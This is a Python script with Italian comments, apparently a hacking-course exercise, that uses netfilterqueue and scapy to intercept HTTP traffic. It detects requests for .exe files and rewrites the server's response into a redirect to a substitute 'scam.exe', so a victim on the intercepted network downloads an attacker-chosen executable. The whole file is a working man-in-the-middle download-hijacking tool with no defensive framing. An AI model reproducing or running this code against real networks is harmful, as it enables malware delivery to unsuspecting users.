import netfilterqueue
import scapy.all as scapy

ack_list = []

def define_load(packet, newload):
    packet[scapy.Raw].load = newload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum  
    return packet


def inject_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        # Se è una richiesta HTTP (porta di destinazione 80)
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print(scapy_packet.show())

                try:
                    payload = scapy_packet[scapy.Raw].load.decode(errors="ignore")
                    if ".exe" in payload and "scam.exe" not in payload:
                        print("[+] File EXE richiesto:", payload)
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                except UnicodeDecodeError:
                    print("[!] Errore di decodifica nella richiesta HTTP, ignorato.")

            # Se è una risposta HTTP (porta di origine 80)
            elif scapy_packet[scapy.TCP].sport == 80:
                print(scapy_packet.show())

                try:
                    payload = scapy_packet[scapy.Raw].load.decode(errors="ignore")
                    if scapy_packet[scapy.TCP].seq in ack_list:
                        ack_list.remove(scapy_packet[scapy.TCP].seq)
                        print("[+] Intercettata risposta al file EXE!")
                                            

                        new_packet = define_load(scapy_packet, 
                            "HTTP/1.1 302 Found\r\n"
                            "Location: http://127.0.0.1:80/scam.exe\r\n"
                            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                            "Pragma: no-cache\r\n"
                            "Expires: 0\r\n"
                            "Connection: close\r\n"
                            "Content-Length: 0\r\n"
                            "Content-Disposition: attachment; filename=\"replaced.exe\"\r\n"
                            "\r\n"
                        )


                        packet.set_payload(bytes(new_packet))
                except UnicodeDecodeError:
                    print("[!] Errore di decodifica nella risposta HTTP, ignorato.")

    packet.accept()


packet_queue = netfilterqueue.NetfilterQueue()
packet_queue.bind(1, inject_packet)
packet_queue.run()
